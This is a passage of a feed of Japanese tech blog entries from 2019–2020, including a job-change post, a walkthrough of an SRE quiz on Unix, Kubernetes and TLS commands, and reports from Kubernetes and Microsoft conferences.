Actionsを使ってdeployしたいGAEのアプ...","isoDate":"2020-05-13T08:20:51.000Z","dateMiliSeconds":1589358051000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"3月末日で退職してました","link":"https://blog.masasuzu.net/entry/2020/04/12/134300","contentSnippet":"株式会社モバイルファクトリーを3/31で退職してました。2010年6月入社なので9年10ヶ月になりますね。今は新しい会社のSREチームで働いています。前半数年間はケータイ向けのサイト(いわゆる着メロサイト)やソーシャルアプリの開発運用をしていました。後半数年間は社内全体の開発基盤・運用基盤の整備をしていました。いわゆるインフラよりのお仕事ですね。入社当時Webアプリケーション開発をまったく分かってなかったところからなんとか人並みに運用開発できる力をこの会社で身につけることが出来たと思います。今なんとかwebエンジニアをやれてるのはこの会社のおかげと言っても過言では無いと思っています。入社当時SQLをまともに書けなかったくらいのレベルだったのでよく採用されたなと。。。お仕事的には回りのレベルも高いし、自身の仕事のやり方も裁量を与えられていたし、社内環境も、待遇も悪くなかった。むしろ良かったくらいでした。ただ、長年勤めていく内に悪い意味での慣れが出てきて、自分自身停滞感を感じることが出てきました。ここ数年が特に感じることが多く、停滞感から来る焦りを日々感じていました。どうにか停滞感を解消するために副業として他社のお仕事を請け負ったりしていましたが、どうにも解消ができずにいました。そんな折に現職のSREチームの話をいただきました。実際に面談、面接を受けて、課題や環境の話を聞くにつれて、ここでなら一歩進めるのではないかという感触を得ました。もちろん焦燥感、停滞感はあれど、居心地が良いと感じてた今までの環境を変えることにはかなりの葛藤がありました。いろんな決め手はあったのですが、新しい場所の方が一番の下手*1でいれそう、なにより事業的にも業務的にも仲間的にもワクワクできそうというあたりが決定打になりました。入社して2週間しかも、初日以外ずっと在宅勤務なのでまだ様子が摑めてないですが、早くキャッチアップしてバリバリ成果を出していきたい所存です。これからもよろしくお願いします。例のもの置いておきます。気が向いたらでよいです。https://www.amazon.jp/hz/wishlist/ls/3S4C1LCDWKCTM?ref_=wl_share*1:情熱プログラマ参照","isoDate":"2020-04-12T04:43:00.000Z","dateMiliSeconds":1586666580000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"IAPに対応しているGAEにアクセスする","link":"https://qiita.com/SatohJohn/items/d21d8487f55ed911e687","contentSnippet":"概要GCPにあるGAEに対してアクセスする場合、認証のためにIAPをつけることが多いハズその際にrequest clientに対して認証情報を付ける方法についてまとめるサービスアカウントを作るサービスアカウントは以下の通りに作成できるhttps://cloud...","isoDate":"2020-03-29T12:12:15.000Z","dateMiliSeconds":1585483935000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Vuetify.jsのリンクの違いについて","link":"https://qiita.com/SatohJohn/items/881d9a6fceceda1c1ce7","contentSnippet":"概要vuetifyのbuttonやlist-itemなどに対してnuxt linkをつける際にリンクの付け方は2つあるhreftoどう使い分けるかというと、 https://qiita.com/white0221/items/ad4136cf2b80eda25...","isoDate":"2020-03-22T11:06:18.000Z","dateMiliSeconds":1584875178000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"圏論とコンピュータサイエンス / Category Theory and Theoretical Computer Science","link":"https://speakerdeck.com/yunosukey/category-theory-and-theoretical-computer-science","contentSnippet":"","isoDate":"2020-03-09T04:00:00.000Z","dateMiliSeconds":1583726400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Merpay SRE Quiz @SRE Next 2020 解答・解説","link":"https://toshikish.hateblo.jp/entry/2020/02/11/024400","contentSnippet":"これは何？2020年1月25日に行われた SRE NEXT 2020 で，メルペイさんがブースで出していた SRE に関するクイズです。正答数で景品がもらえたようです。3問以上：メルペイキーキャップ4問以上：メルペイキーキャップ＋メルペイ SRE が推薦する本今日は SRE NEXT に来ています！ブース出してます！メルペイSREが考えたクイズに挑戦してみてください！#srenext pic.twitter.com/sQmndWucrP— Mercari_Dev (@mercaridevjp) January 25, 2020 メルペイ SRE が推薦する本って？ツイートのスレッドをたどっていくと，ラインナップは以下のようでした。『入門 監視』『詳解 シェルスクリプト』『Kubernetes 完全ガイド』『Programming Kubernetes』『パケットキャプチャの教科書』『プロダクションレディ マイクロサービス』『Linux カーネル Hacks』『エンジニアリング組織論への招待』『エンジニアのためのマネジメントキャリアパス』名著ばかりですね。第1問 SLO とはなんの略でしょうか？選択肢Service Level Observability (サービスレベル可観測性)Service Level Objective (サービスレベル目標)System Level Observability (システムレベル可観測性)System Level Objective (システムレベル目標)正解Service Level Objective (サービスレベル目標)解説SRE 本の Chapter 4 - Service Level Objectives に書かれている定義は以下のとおりです。An SLO is a service level objective: a target value or range of values for a service level that is measured by an SLI.SLI（サービスレベル指標）の目標値または値の範囲を SLO（サービスレベル目標）といいます。第2問 ユーザーが所属しているユーザーグループを知るためのコマンドはどれか？選択肢idwhoamiwholsgroup正解id解説明示されていないですが，UNIX 系 OS のコマンドを前提としていますね。id：ユーザー情報を表示するコマンドで，ユーザー情報（ID，名前）とグループ情報（ID，名前）が表示されます。実行例：foobar@darkstar:~$ iduid=1016(foobar) gid=100(users) groups=100(users)whoami：実行ユーザーの ID を表示するコマンドです。id -un と等価です。who：実行ユーザーの情報（名前，プロセス，起動時刻など）を表示するコマンドです。lsgroup：グループの属性を表示する AIX（IBM の UNIX 系 OS）のコマンドです。デフォルトパラメータがないので，グループを指定するか ALL を指定する必要があります。これらのうち，ユーザーの所属グループが表示されるのは id コマンドです。第3問 $ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\" の出力結果はどれか？選択肢33 2 1error1正解3 2 1解説bash -c string：string が bash で実行されます。echo message：message と改行を出力します。パイプ |：コマンドの出力を次のコマンドの標準入力に渡します。ここでは，3 2 1\\\\n を awk コマンドの標準入力に渡します。awk \'パターン {アクション}\'：AWK のコマンドで，入力に対してパターンにマッチしたものにアクションを適用します。パターンを省略（空パターン）すると，全パターンにマッチする扱いになります。$ bash -c \\"... $1 ...\\"：\\"\\" で囲まれた$ は展開されます。1 という変数名は定義されていないので，$1 が展開されると空文字になります。AWK に伝わるスクリプトは \'{print }\' になり，全パターンに対してそのまま出力する挙動になります。したがって，$ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\"3 2 1となります。ちなみに，1番目のフィールドを表示させたい場合は，$ が展開されないように \\\\$ とエスケープします。$ bash -c \\"echo 3 2 1 | awk \'{print \\\\$1}\'\\"3bash -c \\"...\\" を噛まさなければ，シングルクォート \'\' で囲まれた $ が展開されず，意図通りの挙動になります。$ echo 3 2 1 | awk \'{print $1}\'3エスケープ・展開絡みの落とし穴を題材にした問題ですね。調べてみたら複数事例見つかり，ハマりポイントのようです。stackoverflow.comteratail.com第4問 DNS が使用するポート番号は何番ですか？選択肢225380443正解53解説すべて well-known ポート番号です。22：SSH53：DNS80：HTTP443：HTTPS第5問 Kubernetes の Deployment の Event を見られるコマンドは，以下のうちどれか？選択肢kubectl describe <Deployment Name>kubectl logs -l <Deployment Label>kubectl get deployment <Deployment Name> -o yamlkubectl logs <Deployment Name>正解kubectl describe <Deployment Name>解説kubectl describe：リソースの詳細な情報を出力します。Events: セクションにイベント情報が表示されます。kubectl get events コマンドで全リソースのイベントを表示することができます。kubectl logs：コンテナのログを出力します。--selector (-l) オプションで結果にフィルタをかけることができます。kubectl get：リソースの基本的な情報を取得します。kubectl get deployment <Deployment Name> -o yaml とすると，Deployment の定義を YAML 形式で出力します。kubectl describe コマンドの引数で Deployment の名称を指定すると，その Deployment に関連したイベントを取得できるので，kubectl describe <Deployment Name> が正解です。第6問 Web サイトに設定している TLS 証明書の有効期限を確認できるコマンドは以下のうちどれか？選択肢openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep Aftercurl --tlsv1.2 -l https://www.merpay.com | grep Expirewget --no-check-certificate https://www.merpay.com | grep Certnmap --script ssl-enum-ciphers -p 443 www.merpay.com | grep Date正解openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep After解説openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text：OpenSSL の SSL/TLS クライアントで指定されたホストに接続して証明書を取得し，x509 サブコマンドで証明書情報を取り出します。Not After : で始まる行に有効期限が書かれるので，grep で取り出せます。-text オプションの代わりに -dates オプションを指定すると，証明書の開始日と失効日だけが出力されます。curl --tlsv1.2 -l https://www.merpay.com：Response Body（ここでは HTML）が出力されます。TLS 証明書の情報は含まれません。wget --no-check-certificate https://www.merpay.com：指定した URL の内容を証明書の検証をせずにダウンロードしてファイル（ここでは index.html）に保存します。標準出力にはリクエストの実行ログが吐かれますが，TLS 証明書の情報は含まれません。nmap --script ssl-enum-ciphers -p 443 www.merpay.com：Nmap を用い，指定されたホストに対して SSL/TLS の暗号・圧縮方式を複数試行した結果を出力します。証明書の有効期限の情報は含まれません。実行例：PORT    STATE SERVICE REASON443/tcp open  https   syn-ack| ssl-enum-ciphers:|   TLSv1.0:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|       Weak certificate signature: SHA1|   TLSv1.2:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|_  least strength: CcURL，Nmap で実現する例は以下のとおりです。curl --tlsv1.2 -v https://www.merpay.com 2>&1 | grep expirenmap --script ssl-cert -p 443 www.merpay.com | grep afterserverfault.com感想骨のある問題が多いです。1，4を確実に正解して，その他をどれだけ正解できるかといった感じでしょうか。知らなければ調べればいい話ですが，業務でよく使うコマンドなら覚えておいて手足のように使いこなせるほうが望ましいでしょう。","isoDate":"2020-02-10T17:44:00.000Z","dateMiliSeconds":1581356640000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2019年のふりかえり、2020年の目標","link":"https://kyohmizu.hatenablog.com/entry/2020/02/01/040351","contentSnippet":"すでに年が明けて1ヶ月経ちましたが、2019年の活動を振り返ろうと思います。Kubernetes、Cloud Native技術を中心に学習を進めました。勉強会、カンファレンス1月Cloud Native Meetup Tokyo #6 KubeCon + CNCon RecapKubernetes Meetup Tokyo #15 - KubeCon 2018 RecapRancher/Kubernetes勉強会　Kubernetes管理ツールの活用法OWASP Connect in Tokyo #2今回は特別編！Cloud Nativeなアプリ開発から学んだことを全部シェア - cndjp#92月Yahoo! JAPAN MEETUP #31 インフラ技術カンファレンスGo 1.12 Release Party in Tokyo w/ Fukuoka&Umedassmjp 2019/02Docker Meetup Tokyo #28第三回ボトムアップドメイン駆動設計サイバーセキュリティシンポジウム3月k8s source code reading #3Cloud Native Meetup Tokyo #7 @Abema Towers4月Cloud Native Tokyo #01Serverlessについて思いを馳せる一夜 - cndjp第11回勉強会ssmjp 2019/04Rancher k3s もくもく勉強会 #035月レガシーをぶっつぶせ。現場でDDD！ssmjp 2019/05IIJ Technical NIGHT vol.7SRE Lounge #9Docker Meetup Tokyo #30 (DockerCon・KubeConEU報告会)Yahoo! JAPAN MEETUP #32 インフラ技術／Kubernetes6月NoOps Meetup Tokyo #6Kubernetes Meetup Tokyo #20 - KubeCon RecapGCPUG Tokyo Next Extended 2019 Infra DayInteract 20197月恐るることなかれ! Cloud NativeリレーショナルDB特集!! - cndjp第12回第三十五回 Azureもくもく会 @ 品川CloudNative Days Tokyo Meetup w/ Melanie CebulaKubernetes Meetup Tokyo #21 - Cloud Native CI/CDSekkeiKaigiCloud Native Days Tokyo 2019 → スタッフとして参加8月SRE Lounge #10CloudNative Days Tokyo 2019振り返りNightGo 1.13 Release Party in TokyoKubernetes Meetup Tokyo #229月Docker Meetup Tokyo #32Japan Azure User Group 9周年イベントXP祭り2019golang.tokyo #26Cloud Native Meetup Tokyo #10Kubernetes Meetup Tokyo #23 - Operator Deep Dive10月Terraform meetup tokyo#2Kubernetes Meetup Tokyo #24SRE Lounge #1111月さくらの夕べDocker/Kubernetesナイト #2Go Release 10 Year Anniversary Party in Tokyoゴリラ.vim #10 非公式VimConf後夜祭 girls.vimと合同開催技術書典8 はじめてのサークル参加meetupMicrosoft Open Tech Night #1 - インフラ編+Ignite速報俺たちの最適なCloud Nativeを求めて…。本気のこと始め！ - cndjp第13回12月Japan Rook Meetup #1Cloud Native Meetup Tokyo #11 KubeCon RecapGDG DevFest Tokyo 2019Microsoft Open Tech Night #3 - クラウドネイティブ編登壇資料speakerdeck.comspeakerdeck.comspeakerdeck.com書籍商業誌Kubernetes完全ガイドしくみがわかるKubernetesみんなのDocker/KubernetesKubernetes実践入門情報処理安全確保支援士 教科書みんなのGo言語インフラエンジニアの教科書Linuxのしくみ分散システムデザインパターン入門監視Linux教科書 LPICレベル1Docker実践ガイドKubernetes実践ガイド同人誌ふりかえり読本 場作り編ふりかえり読本 学び編ふりかえり読本 実践編理論と事例でわかる自己肯定感理論と事例でわかるモチベーション現場の「ズレ」を解消するコミュニケーションメソッド 第2版会話の引き出しを増やす 1on1カード と 使いこなしブックPrometheusでKubernetesを監視する本Kubernetes-Native Development & Deployment実践入門 Kubernetes カスタムコントローラへの道Knativeの歩き方資格情報処理安全確保支援士LPIC 101、102ツール・技術DockerKubernetesHelmPrometheusGrafanaLokiArgo CDConcourseTerraformTelepresencecert-managerWindowsコンテナMicrosoft AzureGo言語Vue.js社内での活動定期勉強会を主催ふりかえりを実施、ファシリテーター役Dockerワークショップを開催2020年の目標2020年もCloud Nativeを突き進む予定です。マストCKA、CKADを取得するコミュニティに貢献するOSSにコントリビュートするGo言語でのプログラミングに慣れる英語力を高めるできれば業務としてKubernetesを扱える環境に身を置く（遠回しな表現）技術書を書く","isoDate":"2020-01-31T19:03:51.000Z","dateMiliSeconds":1580497431000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Windowsコンテナのしくみ","link":"https://speakerdeck.com/kyohmizu/windowskontenafalsesikumi","contentSnippet":"Slides for a study meeting.\\rhttps://dockerjp.connpass.com/event/159781/","isoDate":"2020-01-16T05:00:00.000Z","dateMiliSeconds":1579150800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"テストで使いたくて，DinD (Docker in Docker) でk8sの環境を整えた","link":"https://qiita.com/tozastation/items/eafde1a75c35bb9d1a68","contentSnippet":"TL;DRこちらのDockerfileを見納めくださいkindとアプリケーションのコンテナを分けても良かったのですが，kubeconfigの受け渡しが面倒だったので妥協しましたhttps://github.com/tozastation/kw/blob/maste...","isoDate":"2019-12-30T14:30:36.000Z","dateMiliSeconds":1577716236000,"authorName":"tozastation","authorId":"tozastation"},{"title":"0からはじめる Windows on Kubernetes","link":"https://qiita.com/kyohmizu/items/dffdd49123b1e47c3ac4","contentSnippet":"はじめにKubernetes の Windows 対応は v.1.14 でGAとなりました。本記事では、既存の Kubernetes クラスタに0から Windows ワーカーノードを追加する方法をご紹介します。実行環境今回は実行環境として Azure を使用し...","isoDate":"2019-12-22T18:19:52.000Z","dateMiliSeconds":1577038792000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Knative Serving in Production","link":"https://qiita.com/toVersus/items/1317a31fead9b836a68d","contentSnippet":"概要Knative Serving は、ステートレスなアプリケーションを対象に、HTTP リクエスト駆動で自動スケールする仕組みを提供します。Kubernetes (K8s) と Ingress (Istio or Gloo, Ambassader) を程よく抽象化し、...","isoDate":"2019-12-18T22:00:21.000Z","dateMiliSeconds":1576706421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"キャリアアップ支援制度を利用してArchitecting on AWSを受講しましたというアドベントカレンダー書いてました","link":"https://blog.masasuzu.net/entry/2019/12/15/004259","contentSnippet":"tech.mobilefactory.jpだいぶ前に受けたArchitecting on AWSの聴講記録です。","isoDate":"2019-12-14T15:42:59.000Z","dateMiliSeconds":1576338179000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GDG DevFest Tokyo 2019に行ってきた","link":"https://blog.masasuzu.net/entry/2019/12/14/000000","contentSnippet":"tokyo.gdgjapan.org珍しく、何も予定が入ってない土曜日だったので、行ってきました。最近GCPを触る機運が出てきたのでちょうどいいタイミングでした。以下メモGCP 101 | 坂田 純 | GDG DevFest Tokyo 2019主にCloudRunの話。HTTPをlistenするコンテナを起動するサービス。使った分だけ課金対象となる。リクエスト数次第で自動的にスケールする。とお手軽にできそうな印象。インターフェースがHTTPなので基本的にはパブリックでアクセス出来てしまうが、--no-allow-unauthticatedオプションをつけてデプロイするとで限られた人だけ実行できるようになります。これでバッチ的なことができそう?マイクロサービスの開発とテストファースト/テスト駆動開発 | 柴田 芳樹 | GDG DevFest Tokyo 2019ちょいちょいブログとかは見てましたが、話を聞くのは初めてでした。還暦を迎えてもコードをバリバリ書いてるのは素直に尊敬します。メルペイのマイクロサービスのテストにも興味深かったですが、組み込みでのテストの話も興味深く聴かせてもらいました。ツールや環境の充実度の差はあれど、組み込みでもウェブでもやるべきことは同じなのだなと思いました。CloudNative 時代における GKE/Kubernetes ではじめる開発 | 青山 真也 | GDG DevFest Tokyo 2019k8sの紹介的な話。k8s好きになりました。話がすごいうまくて、めんどくさそうだなあと思ってたkubernetesの印象が変わりました。その他:D社のブースを覗いたらMOVの構成図が展示されていて、IoT関連だけAWSを使っていてそれ以外はGCPを使ってるのが興味深かった。IoT関連のものも別で実装して、AWSからは引き上げるようなことを言ってて、なるほどなあとなりました。基本的にAWSで構成されたインフラばかり見てたのでなかなか新鮮でした。","isoDate":"2019-12-13T15:00:00.000Z","dateMiliSeconds":1576249200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"【イベント参加レポート】Microsoft Ignite The Tour Tokyo","link":"https://kyohmizu.hatenablog.com/entry/2019/12/10/012041","contentSnippet":"2019/12/5(木)、6(金)に開催された Microsoft の Tech イベントに参加しました。www.microsoft.com概要アメリカで行われた Ignite のセッションを再演登壇者は他人の資料で発表 (翻訳以上の改変はできないと聞きました)新情報の発表等はされず、通常セッションとハンズオンのみMicrosoft エキスパートとの交流の場外国人のスタッフを多数配置基本的には英語でやり取りするらしい (私は話しませんでした)感想外国人が多く、グローバルな印象を受けました。会場はいつものホテルでしたが、やはりセッションの入れ替え時は非常に混雑します。ブースのエリアはスペースを広くとってあり、割と閑散としていた気がします (セッション中は特に)。技術的には初級者向けの内容が多かったと思います。セッションよりは、どちらかといえばコミュニケーションを重視したイベントのようでした。MSの方やブースの担当者と話すことができ、有意義な時間を過ごせました。参加して得るものはありました。セッション参加セッションのまとめとメモ。THR30031 - Azure とコマンドライン－オプション、ヒント、テクニック難易度：初級メモエクスプローラーでcmdをパスに入力(powershell、wslも)Windows Console → Windows TerminalTerminalはStoreで入手可能Azure CLIやVSCode RemoteはサラッとAPPS30 - コンテナーを利用したアプリケーションの最新化資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps30難易度：初級要点コンテナ、Dockerの基礎的な説明コンテナランタイムやマルチステージビルド等は、軽く話に出る程度コンテナに関しては特に知らない話はなかったACRやACIの概要、使い方の軽い説明サービス移行のデモではコンテナ化してApp Service、CosmosDB、SQL Databaseを使用メモデータセンターのアプリをクラウドにLift&Shift仮想マシンはいいけど無駄が多いコンテナを使ったモダナイゼーションアプリの境界を明確にする旧バージョンの残りファイルがなくなるオーバーヘッドなしでリソース分離繰り返し可能なビルド、環境構築コンテナを使う理由あらゆる環境で同じように動作するベロシティの向上コンテナの仕組み高度に構成されたプロセスcgroupsnamespaceベースイメージからの差分をgzip化したものコンテナランタイムの軽い説明Docker以外にも対応、containerd、runCDockerfileイメージのビルド方法を説明するテキストファイルバッチスクリプトみたいなものビルドリポジトリACRACIサーバーレスのコンテナ実行環境ハイパーバイザーレベルの分離デモサービス移行の話APPS40 - インフラストラクチャと Azure Kubernetes Service を統合する資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps40難易度：中級要点AKSの作成手順の説明AKSとAzureの連携サービスについて知識を整理できたオートスケールの話は理解が浅かったので参考になったAKSを使う最大のメリットはAzureADとの連携ネットワークとセキュリティの話は非常に参考になったネットワークポリシーやAZメモ基本的な使い方ではなく、発展的な内容Tailwind Tradaersのデモ経営、ビジネス課題に対応復元力セキュリティ柔軟性スケールKubernetesを選択する理由抽象化のための標準化されたAPI自己修復スケーラビリティk8sアーキテクチャAKSはマスターノードが無料で提供されるネットワークに2種類指定できるデフォルトはkubenetAzure CNI 仮想ネットワークを使用。大規模ネットワークに対応。きちんと設計する必要があるACIを仮想ノードとして使用AZAKSの作成リソースグループ仮想ネットワークサブネットサービスプリンシパル(k8sから他のリソースを作成)クラスタ本番クラスタを作成するにはオプションを多数指定する必要がある作成時にしか設定できないオプションがあるインストール時にCNI、AZの設定をする仮想ノードの有効化ACIをAKSから使えるようにする必要があるRabbitMQ is 何？HPAメトリクスサーバーにPodから情報が送られる閾値を超えたらスケールクラスタオートスケーラーノードのスケール仮想ノードLinux、Windows、GPUに対応nodeselectorで指定仮想ノードによるスケールのデモネットワークとセキュリティACRでコンテナの脆弱性をチェックAKSを使う最大のメリットはAzureADとの連携！Azure Key VaultPod間の通信Pod IdentityNMI Server(Daemonset)MICAzure Identity BindingネットワークポリシーPod間トラフィックの保護Azure Network PolicyAzure CNIを使ったPodブリッジレベルCalico Network PolicyカーネルレベルAZベータ版データセンター障害の回復性ゾーンは3つまで使用可能ゾーンの数に合わせてレプリカ数を設定THR10007 - ITと技術者の将来について語り合うエモい話要点ディスカッション形式コミュニティ参加やアウトプットを重視しているどんどんチャレンジしてスキルをつけていくことが大事メモ今後あるいは10年後どうなる？これからチャレンジしたいことは？MRフリーランス自分の営業をこれからも続けていく自分が何が得意で、何が苦手かアピールブルーオーシャンを探したいコミュニティのエンパワーメント出てこない人にどうやって技術を好きになってもらうか社内コミュニティを作ってもらうお勧めしたいことは？技術を楽しんで、周りに広めていく仲間ができてコミュニティができる人を変えるのは難しい、好きなことを広めることならできる楽しんでる雰囲気を出していると向こうから来てくれる自分の強みを知って、それを発信していく業務で触ってなくてもコミュニティで発表いていたやりたいこと、好きなことを見つけて、人が見える場所に出していく外のコミュニティに参加してみる会社にいるだけではスキルはプロジェクト依存コミュニティの熱量がすごいアウトプットすると強い人がインプットをくれるとりあえず踏み出してみる楽しんだもの勝ちやりたいことを素直にやってみるUNC10013 - Vue.js 3 に向けた Vue.js 入門難易度：初級～中級要点Vue.js の設計思想、V3 でも使える構文、V3 の新機能コンポジッションAPI関数ベースで提供される APIコンポーネントのロジックが綺麗になるV2 でもお試しで使えるブース立ち寄ったブースの中で、興味を持った内容を紹介します。LenovoLenovo ThinkSystem SE350 | レノボジャパン軽量でコンパクトなエッジサーバーWifi、LTE、有線ネットワーク対応Intel製品概要: OpenVINO™ ツールキットエッジでのディープラーニング推論アプリケーション開発学習済みモデルを無料で利用可能インテルCPUに対応PivotalAzure Spring Cloud | Microsoft DocsSpring Boot アプリをクラウドで実行ベータ版のサービスAKS 上にデプロイされる水平スケールやメトリクス、ログの収集が可能AKS は隠蔽されているため、ユーザーからは見えない手軽に導入できるので POC にも適している","isoDate":"2019-12-09T16:20:41.000Z","dateMiliSeconds":1575908441000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Zero Scale Abstraction in Knative Serving - Part1","link":"https://qiita.com/toVersus/items/9fa635e9cf57643f8dd6","contentSnippet":"Serverless Days Tokyo 2019 の Zero Scale Abstraction in Knative Serving というセッションの内容を書き起こしたものです。スピーカーノートをベースに、セッションの時間内で話せなかった内容も含めて、Knativ...","isoDate":"2019-10-23T13:20:58.000Z","dateMiliSeconds":1571836858000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"LPIC 102 チートシート","link":"https://qiita.com/kyohmizu/items/d5d6fedc527efa9f649c","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数namecontentDISPLAYリモートアクセス先のホストLANGロケール(全カテゴリ)TZタイムゾーンUSERログインユーザーHOSTNAMEホスト名PAT...","isoDate":"2019-10-09T01:56:54.000Z","dateMiliSeconds":1570586214000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"LPIC 101チートシート","link":"https://qiita.com/kyohmizu/items/923844999018fd456d44","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数namecontentPATHコマンドのパスEDITORデフォルトのエディタHISTFILE履歴ファイルのパスHISTFILESIZE履歴ファイルの保存履歴数LD_LIB...","isoDate":"2019-10-09T01:48:33.000Z","dateMiliSeconds":1570585713000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"面倒なことはScalaスクリプトにやらせよう / let scala scripts do the troublesome things","link":"https://speakerdeck.com/nomadblacky/let-scala-scripts-do-the-troublesome-things","contentSnippet":"2019/09/13 Scala秋祭り","isoDate":"2019-09-16T04:00:00.000Z","dateMiliSeconds":1568606400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"de:code 2019 参加レポート","link":"https://kyohmizu.hatenablog.com/entry/2019/06/06/111805","contentSnippet":"Microsoft主催のテクニカルカンファレンス「de:code 2019」に参加してきました。www.microsoft.com参加セッション1日目コンテナ技術を中心にセッションを選択【KN01】基調講演【CD06】しくみがわかる Azure Kubernetes Service (AKS) ～開発者目線で Kubernetes の基本を理解する～【CD01】Windows Containers と Azure による、既存 .NET アプリケーションのモダナイゼーション【CD91】HashiCorp Terraform Azure Provider チュートリアル【CD12】マネージド Kubernetes ガチ本番運用 in ZOZOTOWNwww.youtube.com2日目コンテナ・セキュリティのセッションを選択【SE07】脆弱性はなぜ生まれ、どのように攻撃されるのか? 安全なアプリを開発、運用するためのきほん【CD93】コンテナ環境の永続化ストレージ問題を NetApp Kubernetes Service と Azure NetApp Files でさらっと解決【CM12】.NET Core マルチ プラットフォームの本質【SE05】もうセキュリティはやりたくない!! 第 3 弾 ～Azure Sentinel Deep Dive～注目技術参加したセッションの中で、特に印象に残った or 関心のある技術を取り上げます。Azure Kubernetes Service(AKS)Azureのマネージド Kubernetes サービスである AKS ですが、導入事例が増えてきているそうです。ノロジーズをはじめ、いくつかの企業が自社の導入について講演していました。Kubernetes に概要や操作に関しては特筆することはありませんでしたが、Azure関連の技術として以下に興味を持ちました。Kubernetes-based Event-driven Autoscaling(KEDA)Microsoft と Red Hatが共同作成したプロジェクト。イベント駆動でコンテナのオートスケールを実現します。GitHub - kedacore/keda: KEDA is a Kubernetes-based Event Driven Autoscaling component. It provides event driven scale for any container running in KubernetesVirtual Kubeletkubelet のように動作し、Kubernetes と他のAPIを接続する役割を果たすもの。VM と同じように Kubernetes クラスタで一元管理できます。GitHub - virtual-kubelet/virtual-kubelet: Virtual Kubelet is an open source Kubernetes kubelet implementation.Windows コンテナサポートWindows Server Node が、Kubernetes クラスタで Linux Node と同時に管理できるようになりました。AKS では Multiple Node Pool を使用することで Windows Server Node を作成できます。チュートリアルを試しましたが、なぜかクラスタ作成に失敗)Windows containers now supported in Kubernetes - Open Source blogAzure NetApp FilesNetApp 社の高速ストレージサービス。SSD 並みの速度が出るそうで、Kubernetes の永続化ボリュームとして有用だと思います。また NetApp Kubernetes Service という Kubernetes 管理サービスも提供しているようです。(Rancher みたいなもの？)Azure NetApp Files documentation | Microsoft DocsAzure SentinelAI を使用した高機能なセキュリティサービス。Azure Sentinel | Microsoft Azureその他Azure DevOpsAzure PiplineApp ServiceService 